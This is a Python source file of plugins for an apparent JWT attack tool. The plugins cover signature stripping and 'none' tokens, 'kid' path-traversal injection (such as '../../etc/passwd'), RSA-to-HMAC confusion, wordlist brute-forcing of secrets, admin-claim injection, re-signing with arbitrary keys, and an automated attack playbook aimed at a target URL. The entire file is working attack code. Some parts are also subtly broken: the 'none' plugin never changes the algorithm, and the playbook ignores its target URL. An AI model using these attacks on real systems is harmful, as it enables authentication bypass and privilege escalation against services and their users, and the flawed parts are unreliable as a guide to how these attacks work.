import base64
import json
import jwt
from datetime import datetime
import os
import hmac
import hashlib

class PluginBase:
    def __init__(self, logic):
        self.logic = logic
        self.description = "Base plugin"
        self.options = {}
        self.example_usage = []

    def set_param(self, param, value):
        if param in self.options:
            setattr(self, param, value)
            return f"Set {param} to {value}"
        return f"Parameter {param} not supported."

class SigNonePlugin(PluginBase):
    def __init__(self, logic):
        super().__init__(logic)
        self.description = "Use `none` algorithm to bypass signature verification"
        self.options = {"token": {"description": "JWT to modify", "required": True, "default": None}}
        self.example_usage = ["set token <jwt>", "run"]

    def run(self):
        if not self.logic.tokens.get(self.logic.current_id):
            return "No token set."
        token = self.logic.tokens[self.logic.current_id]["token"]
        return token.rsplit(".", 1)[0] + "."

class AlgKidPlugin(PluginBase):
    def __init__(self, logic):
        super().__init__(logic)
        self.description = "Abuse `kid` parameter to access sensitive keys"
        self.kid = None
        self.secret = None
        self.options = {
            "kid": {"description": "Key ID to inject", "required": True, "default": None},
            "secret": {"description": "Secret key for signing", "required": False, "default": None}
        }
        self.example_usage = ["set kid ../../etc/passwd", "set secret mysecret", "run"]

    def run(self):
        if not self.logic.tokens.get(self.logic.current_id):
            return "No token set."
        if not self.kid:
            return "No kid set. Use 'set kid <value>'."
        header = jwt.get_unverified_header(self.logic.tokens[self.logic.current_id]["token"])
        payload = self.logic.tokens[self.logic.current_id]["decoded"]
        header["kid"] = self.kid
        if self.secret:
            self.logic.set_secret(self.secret)
            return self.logic.sign_hs(header, payload)
        return self.logic._gen_contents(header, payload) + "."

class RsToHsPlugin(PluginBase):
    def __init__(self, logic):
        super().__init__(logic)
        self.description = "Convert RSA to HMAC for signing attacks"
        self.secret = None
        self.options = {"secret": {"description": "HMAC secret", "required": True, "default": None}}
        self.example_usage = ["set secret mysecret", "run"]

    def run(self):
        if not self.logic.tokens.get(self.logic.current_id):
            return "No token set."
        if not self.secret:
            return "No secret set. Use 'set secret <value>'."
        header = jwt.get_unverified_header(self.logic.tokens[self.logic.current_id]["token"])
        payload = self.logic.tokens[self.logic.current_id]["decoded"]
        if not header["alg"].startswith("RS"):
            return "Token is not RSA-signed."
        header["alg"] = "HS256"
        self.logic.set_secret(self.secret)
        return self.logic.sign_hs(header, payload)

class BruteForcePlugin(PluginBase):
    def __init__(self, logic):
        super().__init__(logic)
        self.description = "Attempt to brute-force the secret key"
        self.wordlist = None
        self.options = {"wordlist": {"description": "Path to wordlist", "required": True, "default": None}}
        self.example_usage = ["set wordlist /path/to/wordlist.txt", "run"]

    def run(self):
        if not self.logic.tokens.get(self.logic.current_id):
            return "No token set."
        if not self.wordlist or not os.path.exists(self.wordlist):
            return "Invalid or missing wordlist. Use 'set wordlist <path>'."
        token = self.logic.tokens[self.logic.current_id]["token"]
        header = jwt.get_unverified_header(token)
        if not header["alg"].startswith("HS"):
            return "Token is not HMAC-signed."
        with open(self.wordlist, "r") as f:
            for secret in f:
                secret = secret.strip()
                try:
                    jwt.decode(token, secret, algorithms=[header["alg"]])
                    return f"Secret found: {secret}"
                except jwt.InvalidSignatureError:
                    continue
        return "No secret found in wordlist."

class ClaimInjectPlugin(PluginBase):
    def __init__(self, logic):
        super().__init__(logic)
        self.description = "Inject claims into JWT payload"
        self.payload = None
        self.secret = None
        self.options = {
            "payload": {"description": "JSON string to inject", "required": True, "default": None},
            "secret": {"description": "Secret key for signing", "required": False, "default": None}
        }
        self.example_usage = ["set payload '{\"admin\": true}'", "run"]

    def run(self):
        if not self.logic.tokens.get(self.logic.current_id):
            return "No token set."
        if not self.payload:
            return "No payload set. Use 'set payload <json>'."
        try:
            new_claims = json.loads(self.payload)
        except json.JSONDecodeError:
            return "Invalid JSON payload."
        header = jwt.get_unverified_header(self.logic.tokens[self.logic.current_id]["token"])
        payload = self.logic.tokens[self.logic.current_id]["decoded"]
        payload.update(new_claims)
        if self.secret:
            self.logic.set_secret(self.secret)
            return self.logic.sign_hs(header, payload)
        return self.logic._gen_contents(header, payload) + "."

class TimeFuzzPlugin(PluginBase):
    def __init__(self, logic):
        super().__init__(logic)
        self.description = "Test for time-based vulnerabilities"
        self.offset = 3600
        self.options = {"offset": {"description": "Time offset in seconds", "required": True, "default": "3600"}}
        self.example_usage = ["set offset 7200", "run"]

    def run(self):
        if not self.logic.tokens.get(self.logic.current_id):
            return "No token set."
        header = jwt.get_unverified_header(self.logic.tokens[self.logic.current_id]["token"])
        payload = self.logic.tokens[self.logic.current_id]["decoded"]
        now = int(datetime.now().timestamp())
        for claim in ["iat", "exp", "nbf"]:
            if claim in payload:
                payload[claim] = now + int(self.offset)
        return self.logic.sign_hs(header, payload) if self.logic.tokens[self.logic.current_id]["secret"] else self.logic._gen_contents(header, payload) + "."

class ArbitrarySigPlugin(PluginBase):
    def __init__(self, logic):
        super().__init__(logic)
        self.description = "Sign JWT with arbitrary key"
        self.secret = None
        self.options = {"secret": {"description": "Arbitrary secret key", "required": True, "default": None}}
        self.example_usage = ["set secret arbitrarykey", "run"]

    def run(self):
        if not self.logic.tokens.get(self.logic.current_id):
            return "No token set."
        if not self.secret:
            return "No secret set. Use 'set secret <value>'."
        header = jwt.get_unverified_header(self.logic.tokens[self.logic.current_id]["token"])
        payload = self.logic.tokens[self.logic.current_id]["decoded"]
        self.logic.set_secret(self.secret)
        return self.logic.sign_hs(header, payload)

class KidInjectionPlugin(PluginBase):
    def __init__(self, logic):
        super().__init__(logic)
        self.description = "Inject malicious `kid` values"
        self.kid = None
        self.options = {"kid": {"description": "Key ID to inject", "required": True, "default": None}}
        self.example_usage = ["set kid malicious_kid", "run"]

    def run(self):
        if not self.logic.tokens.get(self.logic.current_id):
            return "No token set."
        if not self.kid:
            return "No kid set. Use 'set kid <value>'."
        header = jwt.get_unverified_header(self.logic.tokens[self.logic.current_id]["token"])
        payload = self.logic.tokens[self.logic.current_id]["decoded"]
        header["kid"] = self.kid
        return self.logic.sign_hs(header, payload) if self.logic.tokens[self.logic.current_id]["secret"] else self.logic._gen_contents(header, payload) + "."

class TokenChainPlugin(PluginBase):
    def __init__(self, logic):
        super().__init__(logic)
        self.description = "Chain multiple token manipulations"
        self.secret = "default_secret"
        self.options = {"secret": {"description": "Secret key for signing", "required": False, "default": "default_secret"}}
        self.example_usage = ["add_token <jwt1>", "add_token <jwt2>", "set secret mysecret", "run"]

    def run(self):
        if len(self.logic.tokens) < 2:
            return "At least two tokens required. Use 'add_token' to add more tokens."
        combined_payload = {}
        for tid, data in self.logic.tokens.items():
            combined_payload.update(data["decoded"])
        header = {"alg": "HS256", "typ": "JWT"}
        self.logic.set_secret(self.secret)
        return self.logic.sign_hs(header, combined_payload)

class SigStripPlugin(PluginBase):
    def __init__(self, logic):
        super().__init__(logic)
        self.description = "Strip signature to test validation behavior"
        self.options = {"token": {"description": "JWT to strip", "required": True, "default": None}}
        self.example_usage = ["set token <jwt>", "run"]

    def run(self):
        if not self.logic.tokens.get(self.logic.current_id):
            return "No token set."
        token = self.logic.tokens[self.logic.current_id]["token"]
        return token.rsplit(".", 1)[0] + "."

class AlgDowngradePlugin(PluginBase):
    def __init__(self, logic):
        super().__init__(logic)
        self.description = "Downgrade JWT algorithm for easier exploitation"
        self.secret = "downgraded"
        self.options = {"secret": {"description": "Secret key for HMAC", "required": False, "default": "downgraded"}}
        self.example_usage = ["set secret mysecret", "run"]

    def run(self):
        if not self.logic.tokens.get(self.logic.current_id):
            return "No token set."
        header = jwt.get_unverified_header(self.logic.tokens[self.logic.current_id]["token"])
        payload = self.logic.tokens[self.logic.current_id]["decoded"]
        if header["alg"].startswith("RS") or header["alg"].startswith("ES"):
            header["alg"] = "HS256"
            self.logic.set_secret(self.secret)
            return self.logic.sign_hs(header, payload)
        return "Algorithm already weak or unsupported."

class DynamicPlaybookPlugin(PluginBase):
    def __init__(self, logic):
        super().__init__(logic)
        self.description = "Automated JWT attack chaining"
        self.target_url = None
        self.options = {"target_url": {"description": "Target URL to test", "required": True, "default": None}}
        self.example_usage = ["set target_url http://example.com", "run"]

    def run(self):
        if not self.logic.tokens.get(self.logic.current_id):
            return "No token set."
        if not self.target_url:
            return "No target URL set. Use 'set target_url <url>'."
        header = jwt.get_unverified_header(self.logic.tokens[self.logic.current_id]["token"])
        payload = self.logic.tokens[self.logic.current_id]["decoded"]
        exploits = ["sig_none", "sig_strip", "time_fuzz"]
        results = []
        for exploit in exploits:
            token = self._generate_exploit(exploit, header, payload)
            results.append(f"{exploit}: {token}")
        return "\n".join(results)

    def _generate_exploit(self, exploit, header, payload):
        if exploit == "sig_none":
            return self.logic.tokens[self.logic.current_id]["token"].rsplit(".", 1)[0] + "."
        elif exploit == "sig_strip":
            return self.logic.tokens[self.logic.current_id]["token"].rsplit(".", 1)[0] + "."
        elif exploit == "time_fuzz":
            payload["exp"] = int(datetime.now().timestamp()) + 3600
            return self.logic.sign_hs(header, payload) if self.logic.tokens[self.logic.current_id]["secret"] else self.logic._gen_contents(header, payload) + "."

PLUGINS = {
    "sig_none": SigNonePlugin,
    "alg_kid": AlgKidPlugin,
    "rs_to_hs": RsToHsPlugin,
    "brute_force": BruteForcePlugin,
    "claim_inject": ClaimInjectPlugin,
    "time_fuzz": TimeFuzzPlugin,
    "arbitrary_sig": ArbitrarySigPlugin,
    "kid_inject": KidInjectionPlugin,
    "token_chain": TokenChainPlugin,
    "sig_strip": SigStripPlugin,
    "alg_downgrade": AlgDowngradePlugin,
    "dynamic_playbook": DynamicPlaybookPlugin,
}